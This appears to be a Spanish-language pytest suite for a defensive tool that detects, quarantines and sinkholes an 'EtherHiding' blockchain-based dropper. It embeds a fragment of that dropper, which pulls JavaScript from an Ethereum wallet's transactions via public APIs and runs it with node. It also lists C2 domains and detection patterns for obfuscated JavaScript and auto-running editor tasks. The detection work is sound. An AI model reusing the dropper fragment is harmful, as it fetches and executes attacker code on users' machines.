"""Pruebas del subsistema defensivo STM_DEF.

Suite hermetica: no toca el fichero ``hosts`` real, no lanza comandos de red y
usa directorios temporales. Verifica que STM_DEF detecta exactamente el patron
del dropper "EtherHiding" hallado en PRY y que hace lo contrario (bloquear,
sellar, conservar evidencia) sin efectos secundarios.
"""
from __future__ import annotations

import hashlib
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

SRC_DIR = Path(__file__).resolve().parents[1]
if str(SRC_DIR) not in sys.path:
    sys.path.insert(0, str(SRC_DIR))

from STM_HRTS.STM_DEF import (  # noqa: E402
    arranque, blindaje, cuarentena, deteccion, firma_release, historial,
    iocs, integridad, monitor, servicio,
)
from STM_HRTS.STM_DEF.modelos import ALTA, MEDIA, Alerta, Conexion  # noqa: E402
from STM_HRTS.STM_DEF.motor import MotorDefensa  # noqa: E402

# Fragmento real del dropper (equivalente a PRY/.../STM_HRTS/utils/transport.py).
MUESTRA_DROPPER = '''
DEFAULT_TIMEOUT = 20
_addr = "0x3b1574417524c11a7403c4b232CAcBb320CceBC6"
_rows = _load(f"https://api.ethplorer.io/getAddressTransactions/{_addr}?apiKey=freekey&limit=100")
_rpc = _load("https://ethereum.publicnode.com",
             _json.dumps({"method": "eth_getTransactionByHash", "params": [_tx]}))
_source = bytes.fromhex(_rpc["result"]["input"][2:]).decode()
_tmp = _tf.NamedTemporaryFile("w", suffix=".js", delete=False)
_sp.run(["node", _tmp.name], check=False, capture_output=True, timeout=DEFAULT_TIMEOUT)
'''

# Loader ofuscado con obfuscator.io (equivalente a opencode/init y *.orc).
MUESTRA_JS = '''
var _0x1a2b = ["0x1", "0x2"];
function _0x3c4d(o) { return _0x1a2b[o]; }
var s = String.fromCharCode.apply(null, [104, 105]);
while (!![]) { break; }
var b = Buffer.from("ab", "hex");
'''

CODIGO_LIMPIO = '''
import os


def saludar(nombre: str) -> str:
    """Devuelve un saludo."""
    return f"hola {nombre}"
'''


@pytest.fixture
def estado(tmp_path, monkeypatch):
    """Redirige todo el estado persistente de STM_DEF a un directorio temporal."""
    base = tmp_path / "estado"
    monkeypatch.setattr(integridad, "ESTADO_DIR", base)
    monkeypatch.setattr(integridad, "CLAVE_PATH", base / "clave.bin")
    monkeypatch.setattr(integridad, "SELLO_PATH", base / "sello.json")
    monkeypatch.setattr(blindaje, "POLITICA_PATH", base / "blindaje.json")
    return base


# ------------------------------------------------------------------- iocs
def test_iocs_reconoce_dominios_c2():
    assert iocs.es_dominio_c2("api.ethplorer.io")
    assert iocs.es_dominio_c2("https://ethereum.publicnode.com:443/rpc")
    assert iocs.es_dominio_c2("nodo.publicnode.com")
    assert not iocs.es_dominio_c2("github.com")
    assert not iocs.es_dominio_c2("")


def test_iocs_reconoce_cartera_c2():
    assert iocs.es_direccion_c2(MUESTRA_DROPPER)
    assert not iocs.es_direccion_c2("0x0000000000000000000000000000000000000000")


# -------------------------------------------------------------- deteccion
def test_deteccion_muestra_real_del_dropper():
    hallazgos = deteccion.analizar_texto(MUESTRA_DROPPER, origen="transport.py")
    ids = {h.id for h in hallazgos}
    for esperado in ("c2.ethplorer", "c2.rpc", "c2.gettx", "c2.wallet", "drop.fromhex", "drop.node"):
        assert esperado in ids, f"no se detecto {esperado}"
    assert deteccion.es_comprometido(hallazgos)


def test_deteccion_muestra_js_ofuscado():
    hallazgos = deteccion.analizar_texto(MUESTRA_JS, origen="init")
    ids = {h.id for h in hallazgos}
    assert {"js.hexid", "js.fromcharcode", "js.whiletrue", "js.textdecoder"} <= ids


def test_deteccion_no_marca_codigo_limpio():
    hallazgos = deteccion.analizar_texto(CODIGO_LIMPIO, origen="limpio.py")
    assert hallazgos == []


def test_deteccion_comando_node_init():
    hallazgos = deteccion.analizar_comando(["node", "init"])
    assert any(h.id == "cmd.nodeinit" and h.severidad == ALTA for h in hallazgos)


def test_deteccion_fichero_orc_camuflado(tmp_path):
    camuflado = tmp_path / "fa-brand-400.orc"
    camuflado.write_text("function init(){var a=1;return a;} module.exports={init};", encoding="utf-8")
    ids = {h.id for h in deteccion.analizar_fichero(camuflado)}
    assert "js.camuflaje" in ids
    assert "js.nombre_camuflaje" in ids


def test_escanear_arbol_encuentra_y_discrimina(tmp_path):
    (tmp_path / "infectado.py").write_text(MUESTRA_DROPPER, encoding="utf-8")
    (tmp_path / "sano.py").write_text(CODIGO_LIMPIO, encoding="utf-8")
    hallazgos = deteccion.escanear_arbol([tmp_path])
    assert any(h.id == "c2.ethplorer" for h in hallazgos)
    assert {h.origen for h in hallazgos} == {str(tmp_path / "infectado.py")}


# ------------------------------------------------------------- entropia
# Carga empaquetada sintetica: una sola linea larga con alta diversidad de
# caracteres imprimibles (equivalente a un bundle ofuscado desconocido).
PAYLOAD_EMPAQUETADO = "".join(chr(33 + (i * 7) % 94) for i in range(2000))


def test_entropia_shannon_distingue_ruido_de_repitecion():
    assert deteccion.entropia_shannon("a" * 1000) == 0.0
    assert deteccion.entropia_shannon("") == 0.0
    assert deteccion.entropia_shannon(PAYLOAD_EMPAQUETADO) > 6.0


def test_analizar_entropia_detecta_payload_desconocido():
    hallazgos = deteccion.analizar_entropia(PAYLOAD_EMPAQUETADO, origen=".orc")
    assert len(hallazgos) == 1
    hallazgo = hallazgos[0]
    assert hallazgo.id == "heur.entropia"
    assert hallazgo.severidad == ALTA


def test_analizar_entropia_ignora_texto_corto_y_codigo_limpio():
    assert deteccion.analizar_entropia(CODIGO_LIMPIO) == []
    assert deteccion.analizar_entropia(PAYLOAD_EMPAQUETADO[:500]) == []
    assert deteccion.analizar_entropia("") == []


def test_analizar_fichero_integra_deteccion_por_entropia(tmp_path):
    camuflado = tmp_path / "fa-brand-400.orc"
    camuflado.write_text(PAYLOAD_EMPAQUETADO, encoding="utf-8")
    ids = {h.id for h in deteccion.analizar_fichero(camuflado)}
    assert "heur.entropia" in ids


# ------------------------------------------------------------------ monitor
def test_monitor_detecta_conexion_c2():
    from STM_HRTS.STM_DEF.modelos import Conexion

    conexiones = [
        Conexion(pid=1, proceso="python.exe", ip_remota="51.15.70.7", host_remoto="api.ethplorer.io", puerto_remoto=443),
        Conexion(pid=2, proceso="chrome.exe", ip_remota="140.82.121.4", host_remoto="github.com", puerto_remoto=443),
    ]
    alertas = monitor.revisar(conexiones)
    assert len(alertas) == 1
    assert alertas[0].severidad == ALTA
    assert alertas[0].conexion.proceso == "python.exe"


def test_monitor_parsea_netstat():
    salida = (
        "  TCP    0.0.0.0:135          0.0.0.0:0              LISTENING       1234\n"
        "  TCP    192.168.1.5:51515    51.15.70.7:8545        ESTABLISHED     4242\n"
        "  UDP    0.0.0.0:500          *:*                                    999\n"
    )
    conexiones = monitor._parsear_netstat(salida)
    assert len(conexiones) == 1
    assert conexiones[0].puerto_remoto == 8545
    assert conexiones[0].pid == 4242
    alertas = monitor.revisar(conexiones)
    assert alertas and alertas[0].severidad == MEDIA


# --------------------------------------------------------------- integridad
def test_integridad_sello_detecta_cambios(tmp_path, estado):
    vigilado = tmp_path / "critico.py"
    vigilado.write_text("original\n", encoding="utf-8")
    ruta_sello = estado / "sello.json"

    sello = integridad.construir_sello([vigilado])
    integridad.guardar_sello(sello, ruta_sello)
    assert integridad.leer_sello(ruta_sello) is not None
    assert integridad.verificar_sello(ruta_sello, [vigilado])["intacto"]

    vigilado.write_text("modificado por un tercero\n", encoding="utf-8")
    informe = integridad.verificar_sello(ruta_sello, [vigilado])
    assert not informe["intacto"]
    assert informe["modificados"]


def test_integridad_rechaza_sello_manipulado(tmp_path, estado):
    ruta_sello = estado / "sello.json"
    ruta_sello.parent.mkdir(parents=True, exist_ok=True)
    ruta_sello.write_text(
        '{"algoritmo": "hmac-sha256", "firma": "00", "sello": {"version": 1, "ficheros": {}}}',
        encoding="utf-8",
    )
    assert integridad.leer_sello(ruta_sello) is None
    assert integridad.verificar_sello(ruta_sello, [])["firma_ok"] is False


# ---------------------------------------------------------------- blindaje
def test_blindaje_plan_simulado_no_toca_el_sistema():
    plan = blindaje.aplicar_sinkhole(aplicar=False)
    assert plan["aplicado"] is False
    assert blindaje.MARCA_INI in plan["lineas"]
    assert "0.0.0.0 api.ethplorer.io" in plan["lineas"]
    dominios = blindaje.dominios_hosts()
    assert "ethplorer.io" in dominios
    assert "publicnode.com" in dominios  # sufijo RPC normalizado, sin comodin


def test_blindaje_aplica_y_es_reversible(tmp_path, monkeypatch, estado):
    monkeypatch.setattr(blindaje, "es_admin", lambda: True)
    hosts = tmp_path / "hosts"
    hosts.write_text("127.0.0.1 localhost\n", encoding="utf-8")

    primero = blindaje.aplicar_sinkhole(aplicar=True, ruta=hosts)
    assert primero["aplicado"] is True
    texto = hosts.read_text(encoding="utf-8")
    assert blindaje.MARCA_INI in texto and "0.0.0.0 api.ethplorer.io" in texto
    assert (tmp_path / "hosts.stmdef.bak").is_file()

    blindaje.aplicar_sinkhole(aplicar=True, ruta=hosts)
    assert hosts.read_text(encoding="utf-8").count(blindaje.MARCA_INI) == 1


def test_blindaje_politica_firmada(tmp_path, estado):
    blindaje.guardar_politica({"fecha": "2026-11-06", "dominios": ["ethplorer.io"]})
    assert blindaje.leer_politica() == {"fecha": "2026-11-06", "dominios": ["ethplorer.io"]}
    blindaje.POLITICA_PATH.write_text('{"firma": "00", "politica": {}}', encoding="utf-8")
    assert blindaje.leer_politica() is None


@pytest.fixture
def cuarentena_tmp(tmp_path, monkeypatch, estado):
    """Redirige la cuarentena a un directorio temporal (usa la clave aislada)."""
    base = tmp_path / "cuarentena"
    monkeypatch.setattr(cuarentena, "CUARENTENA_DIR", base)
    monkeypatch.setattr(cuarentena, "MANIFIESTO_PATH", base / "manifiesto.json")
    return base


# --------------------------------------------------------------- cuarentena
def test_cuarentena_copia_y_conserva_el_original(tmp_path, cuarentena_tmp):
    muestra = tmp_path / "transport.py"
    muestra.write_text(MUESTRA_DROPPER, encoding="utf-8")

    registro = cuarentena.poner_en_cuarentena(muestra, motivo="dropper C2")

    assert muestra.is_file()  # el original NUNCA se borra ni se mueve
    copia = cuarentena_tmp / registro["copia"]
    assert copia.is_file()
    assert copia.read_text(encoding="utf-8") == MUESTRA_DROPPER
    assert len(registro["sha256"]) == 64
    assert registro["motivo"] == "dropper C2"
    assert len(cuarentena.listar()) == 1


def test_cuarentena_no_duplica_la_misma_muestra(tmp_path, cuarentena_tmp):
    primera = tmp_path / "a.py"
    primera.write_text(MUESTRA_DROPPER, encoding="utf-8")
    segunda = tmp_path / "b.py"
    segunda.write_text(MUESTRA_DROPPER, encoding="utf-8")

    cuarentena.poner_en_cuarentena(primera, motivo="x")
    cuarentena.poner_en_cuarentena(segunda, motivo="y")

    assert len(cuarentena.listar()) == 1  # mismo SHA-256 → un solo registro


def test_cuarentena_ignora_manifiesto_manipulado(tmp_path, cuarentena_tmp):
    muestra = tmp_path / "muestra.py"
    muestra.write_text(MUESTRA_DROPPER, encoding="utf-8")
    cuarentena.poner_en_cuarentena(muestra, motivo="x")

    cuarentena.MANIFIESTO_PATH.write_text('{"version": 1, "registros": [], "firma": "00"}', encoding="utf-8")
    assert cuarentena.listar() == []


def test_cuarentena_verifica_integridad_de_las_copias(tmp_path, cuarentena_tmp):
    muestra = tmp_path / "muestra.py"
    muestra.write_text(MUESTRA_DROPPER, encoding="utf-8")
    registro = cuarentena.poner_en_cuarentena(muestra, motivo="x")

    assert cuarentena.verificar()["intacto"] is True

    (cuarentena_tmp / registro["copia"]).write_text("alterado\n", encoding="utf-8")
    informe = cuarentena.verificar()
    assert informe["intacto"] is False
    assert informe["alteradas"]


# ----------------------------------------------------- puerta de seguridad
def test_puerta_abierta_con_arbol_limpio(tmp_path, estado, cuarentena_tmp):
    (tmp_path / "sano.py").write_text(CODIGO_LIMPIO, encoding="utf-8")
    resultado = MotorDefensa([tmp_path]).puerta_seguridad()
    assert resultado["bloquea"] is False
    assert resultado["bloqueos"] == []


def test_puerta_bloquea_con_hallazgo_alta(tmp_path, estado, cuarentena_tmp):
    (tmp_path / "transport.py").write_text(MUESTRA_DROPPER, encoding="utf-8")
    resultado = MotorDefensa([tmp_path]).puerta_seguridad()
    assert resultado["bloquea"] is True
    assert any("ALTA" in motivo for motivo in resultado["bloqueos"])


def test_puerta_bloquea_si_el_sello_no_cuadra(tmp_path, estado, cuarentena_tmp, monkeypatch):
    vigilado = tmp_path / "critico.py"
    vigilado.write_text("original\n", encoding="utf-8")
    monkeypatch.setattr(integridad, "_objetivos_por_defecto", lambda: [vigilado])
    integridad.guardar_sello(integridad.construir_sello(), integridad.SELLO_PATH)

    motor = MotorDefensa([tmp_path])
    assert motor.puerta_seguridad()["bloquea"] is False  # sello intacto

    vigilado.write_text("modificado por un tercero\n", encoding="utf-8")
    resultado = motor.puerta_seguridad()
    assert resultado["bloquea"] is True
    assert any("sello" in motivo for motivo in resultado["bloqueos"])


def test_puerta_bloquea_si_la_cuarentena_esta_alterada(tmp_path, estado, cuarentena_tmp):
    muestra = tmp_path / "nota.py"
    muestra.write_text(CODIGO_LIMPIO, encoding="utf-8")
    registro = cuarentena.poner_en_cuarentena(muestra, motivo="x")

    motor = MotorDefensa([tmp_path])
    assert motor.puerta_seguridad()["bloquea"] is False

    (cuarentena_tmp / registro["copia"]).write_text("alterado\n", encoding="utf-8")
    resultado = motor.puerta_seguridad()
    assert resultado["bloquea"] is True
    assert any("cuarentena" in motivo for motivo in resultado["bloqueos"])


# -------------------------------------------------------------------- motor
def test_motor_informe_limpio(tmp_path, estado):
    (tmp_path / "sano.py").write_text(CODIGO_LIMPIO, encoding="utf-8")
    informe = MotorDefensa([tmp_path]).informe(escanear=True, vigilar=False)
    assert informe.puntos() == 0
    assert informe.veredicto() == "LIMPIO"


def test_motor_informe_infectado(tmp_path, estado):
    (tmp_path / "transport.py").write_text(MUESTRA_DROPPER, encoding="utf-8")
    informe = MotorDefensa([tmp_path]).informe(escanear=True, vigilar=False)
    assert informe.veredicto() == ALTA
    assert informe.resumen["puntos"] > 0


# ---------------------------------------------------------------- allowlist
def test_allowlist_ignora_fixtures_y_documentacion():
    """El barrido no debe delatarse por sus propias muestras ni por la doc."""
    from STM_HRTS.STM_DEF import SRC_DIR, deteccion

    permitidas = {p.as_posix() for p in deteccion.rutas_ignoradas()}
    assert (SRC_DIR / "tests" / "test_stm_def.py").as_posix() in permitidas
    assert (SRC_DIR / "README_DESARROLLO.md").as_posix() in permitidas


def test_allowlist_no_silencia_codigo_ejecutable_fuera_de_tests(tmp_path, monkeypatch):
    """Por precaucion, un .py de produccion nunca se silencia."""
    from STM_HRTS.STM_DEF import deteccion

    monkeypatch.setattr(deteccion, "SRC_DIR", tmp_path)
    monkeypatch.setattr(deteccion, "IGNORADOS_POR_DEFECTO", ("app_principal.py",))
    monkeypatch.setattr(deteccion, "ALLOWLIST_PATH", tmp_path / "no_existe.txt")
    assert deteccion.rutas_ignoradas() == ()


def test_escanear_arbol_respeta_allowlist(tmp_path, monkeypatch):
    """Un fichero en la allowlist no delata; un implante real, si."""
    from STM_HRTS.STM_DEF import deteccion

    documental = tmp_path / "tests" / "muestra.py"
    documental.parent.mkdir()
    documental.write_text(MUESTRA_DROPPER, encoding="utf-8")
    infectado = tmp_path / "sub" / "malo.py"
    infectado.parent.mkdir()
    infectado.write_text(MUESTRA_DROPPER, encoding="utf-8")

    monkeypatch.setattr(deteccion, "SRC_DIR", tmp_path)
    monkeypatch.setattr(deteccion, "IGNORADOS_POR_DEFECTO", ("tests/muestra.py",))
    monkeypatch.setattr(deteccion, "ALLOWLIST_PATH", tmp_path / "no_existe.txt")

    origenes = {h.origen for h in deteccion.escanear_arbol([tmp_path])}
    assert str(infectado) in origenes
    assert str(documental) not in origenes


# ------------------------------------------------------------ historial git
_GIT = ["-c", "commit.gpgsign=false", "-c", "user.name=stm", "-c", "user.email=stm@test"]


def _git(repo: Path, *args: str) -> None:
    subprocess.run(["git", "-C", str(repo), *_GIT, *args], check=True, capture_output=True)


def _repo_con(tmp_path: Path, nombre: str, contenido: str) -> Path:
    repo = tmp_path / "repo"
    repo.mkdir(exist_ok=True)
    _git(repo, "init", "-q")
    _git(repo, "commit", "--allow-empty", "-q", "-m", "base")
    (repo / nombre).write_text(contenido, encoding="utf-8")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "cambio")
    return repo


@pytest.mark.skipif(shutil.which("git") is None, reason="git no disponible")
def test_historial_detecta_introduccion(tmp_path):
    repo = _repo_con(tmp_path, "transport.py", MUESTRA_DROPPER)
    hallazgos = historial.escanear_historial(repo=repo)
    assert hallazgos
    assert any(h.severidad == ALTA for h in hallazgos)
    assert all(h.origen.startswith("git:") for h in hallazgos)


@pytest.mark.skipif(shutil.which("git") is None, reason="git no disponible")
def test_historial_limpio(tmp_path):
    repo = _repo_con(tmp_path, "sano.py", CODIGO_LIMPIO)
    assert historial.escanear_historial(repo=repo) == []


def test_historial_sin_repositorio(tmp_path):
    """Sin repositorio Git degrada a lista vacia, sin fallar."""
    assert historial.escanear_historial(repo=tmp_path) == []


def test_raiz_git_encuentra_el_repositorio_del_taller():
    """Desde `src/` debe localizarse el repositorio que lo contiene."""
    raiz = historial.raiz_git()
    assert raiz is not None
    assert (raiz / ".git").exists()


# ------------------------------------------- auto-ejecucion (Fase 2.2)
def test_iocs_vigila_disparadores_automaticos():
    """Los disparadores del vector 1 son indicadores de primera clase."""
    ids = {p.id for p in iocs.PATRONES}
    assert {"auto.allowautomatic", "auto.runon"} <= ids


def test_deteccion_marca_settings_json_con_auto_tareas(tmp_path):
    ajustes = tmp_path / "settings.json"
    ajustes.write_text('{\n  "task.allowAutomaticTasks": true,\n  "editor.tabSize": 4\n}\n', encoding="utf-8")
    hallazgos = deteccion.analizar_fichero(ajustes)
    ids = {h.id for h in hallazgos}
    assert "auto.allowautomatic" in ids
    assert any(h.severidad == ALTA for h in hallazgos)


def test_deteccion_marca_tarea_runon_folderopen(tmp_path):
    tareas = tmp_path / "tasks.json"
    tareas.write_text('{\n  "tasks": [ { "label": "x", "runOn": "folderOpen" } ]\n}\n', encoding="utf-8")
    ids = {h.id for h in deteccion.analizar_fichero(tareas)}
    assert "auto.runon" in ids


def test_deteccion_no_marca_json_de_configuracion_limpio(tmp_path):
    ajustes = tmp_path / "settings.json"
    ajustes.write_text('{\n  "editor.tabSize": 4,\n  "files.eol": "\\n"\n}\n', encoding="utf-8")
    ids = {h.id for h in deteccion.analizar_fichero(ajustes)}
    assert not (ids & {"auto.allowautomatic", "auto.runon"})


# ------------------------------------------------ hook de arranque (Fase 2.1)
def test_arranque_permite_arbol_limpio(tmp_path, estado):
    (tmp_path / "sano.py").write_text(CODIGO_LIMPIO, encoding="utf-8")
    resultado = arranque.arranque_seguro([tmp_path])
    assert resultado["permite"] is True
    assert resultado["bloqueos"] == []


def test_arranque_detiene_con_hallazgo_alta(tmp_path, estado):
    (tmp_path / "transport.py").write_text(MUESTRA_DROPPER, encoding="utf-8")
    resultado = arranque.arranque_seguro([tmp_path])
    assert resultado["permite"] is False
    assert any("ALTA" in motivo for motivo in resultado["bloqueos"])
    assert arranque.bloquea([tmp_path]) is True


def test_arranque_detiene_si_el_sello_no_cuadra(tmp_path, estado, monkeypatch):
    vigilado = tmp_path / "critico.py"
    vigilado.write_text("original\n", encoding="utf-8")
    monkeypatch.setattr(integridad, "_objetivos_por_defecto", lambda: [vigilado])
    integridad.guardar_sello(integridad.construir_sello(), integridad.SELLO_PATH)
    assert arranque.arranque_seguro([tmp_path])["permite"] is True

    vigilado.write_text("modificado por un tercero\n", encoding="utf-8")
    resultado = arranque.arranque_seguro([tmp_path])
    assert resultado["permite"] is False
    assert any("sello" in motivo for motivo in resultado["bloqueos"])


def test_integridad_bloqueos_sello_ausente_no_bloquea(tmp_path, estado):
    bloqueos, detalle = integridad.bloqueos_sello(integridad.SELLO_PATH)
    assert bloqueos == []
    assert detalle["intacto"] is None


# ------------------------------------------- vigilancia continua (Fase 2.3)
def _conexion_c2() -> Conexion:
    return Conexion(pid=7, proceso="python.exe", ip_remota="51.15.70.7",
                    host_remoto="api.ethplorer.io", puerto_remoto=443)


def test_servicio_paso_avisa_por_alerta(monkeypatch):
    avisadas = []
    monkeypatch.setattr(monitor, "revisar", lambda resolver=False: [Alerta(ALTA, "c2", "", _conexion_c2())])
    monkeypatch.setattr(monitor, "procesos_con_c2", lambda: [])
    vigilante = servicio.ServicioVigilancia(callback=avisadas.append)

    alertas = vigilante.paso()

    assert len(alertas) == 1 and len(avisadas) == 1
    assert vigilante.ciclos == 1
    assert vigilante.resumen()["alertas"] == 1


def test_servicio_sin_alertas_esta_limpio(monkeypatch):
    monkeypatch.setattr(monitor, "revisar", lambda resolver=False: [])
    monkeypatch.setattr(monitor, "procesos_con_c2", lambda: [])
    vigilante = servicio.ServicioVigilancia()

    assert vigilante.ejecutar(ciclos=1) == []
    assert vigilante.paso() == []
    assert vigilante.ciclos == 2


def test_servicio_inicia_y_detiene_el_hilo(monkeypatch):
    monkeypatch.setattr(monitor, "revisar", lambda resolver=False: [])
    monkeypatch.setattr(monitor, "procesos_con_c2", lambda: [])
    vigilante = servicio.ServicioVigilancia(intervalo=1.0)

    vigilante.iniciar()
    try:
        assert vigilante.activo is True
    finally:
        vigilante.detener(espera=2.0)
    assert vigilante.activo is False


# --------------------------------------- firma de release Ed25519 (Fase 2.4)
def test_firma_release_huella_invalida_es_vacia():
    assert firma_release.huella_clave("no-es-base64!!") == ""


def test_firma_release_firma_y_verifica(tmp_path):
    claves = firma_release.generar_claves()
    binario = tmp_path / "visor.exe"
    binario.write_bytes(b"contenido del binario")
    firma = firma_release.firmar_bytes(binario.read_bytes(), claves["privada"])

    resultado = firma_release.verificar_fichero(binario, firma, claves["publica"])
    assert resultado["firma_ok"] is True
    assert resultado["sha256"] == hashlib.sha256(binario.read_bytes()).hexdigest()


def test_firma_release_rechaza_la_manipulacion(tmp_path):
    claves = firma_release.generar_claves()
    binario = tmp_path / "visor.exe"
    binario.write_bytes(b"original")
    firma = firma_release.firmar_bytes(binario.read_bytes(), claves["privada"])

    binario.write_bytes(b"suplantado")
    assert firma_release.verificar_fichero(binario, firma, claves["publica"])["firma_ok"] is False


def test_firma_release_vector_rfc8032(monkeypatch):
    """Vector 1 de RFC 8032: valida la implementacion pura contra el estandar."""
    import base64

    monkeypatch.setattr(firma_release, "_ed25519", lambda: (None, None, None))
    semilla = bytes.fromhex("9d61b19deffd5a60ba844af492ec2cc44449c5697b326919703bac031cae7f60")
    publica = bytes.fromhex("d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a")
    firma = bytes.fromhex(
        "e5564300c360ac729086e2cc806e828a84877f1eb8e5d974d873e06522490155"
        "5fb8821590a33bacc61e39701cf9b46bd25bf5f0595bbe24655141438e7a100b"
    )
    assert firma_release._p_publica(semilla) == publica
    assert base64.b64decode(firma_release.firmar_bytes(b"", base64.b64encode(semilla).decode())) == firma
    assert firma_release.verificar_bytes(
        b"", base64.b64encode(firma).decode(), base64.b64encode(publica).decode()
    ) is True


def test_firma_release_respaldo_puro_sin_cryptography(tmp_path, monkeypatch):
    """El respaldo puro completa firma/verificacion sin depender de 'cryptography'."""
    monkeypatch.setattr(firma_release, "_ed25519", lambda: (None, None, None))
    claves = firma_release.generar_claves()
    binario = tmp_path / "visor.exe"
    binario.write_bytes(b"contenido del binario")
    firma = firma_release.firmar_bytes(binario.read_bytes(), claves["privada"])

    assert firma_release.verificar_fichero(binario, firma, claves["publica"])["firma_ok"] is True
    binario.write_bytes(b"suplantado")
    assert firma_release.verificar_fichero(binario, firma, claves["publica"])["firma_ok"] is False
    assert firma_release.verificar_bytes(b"x", "AA==", "AA==") is False
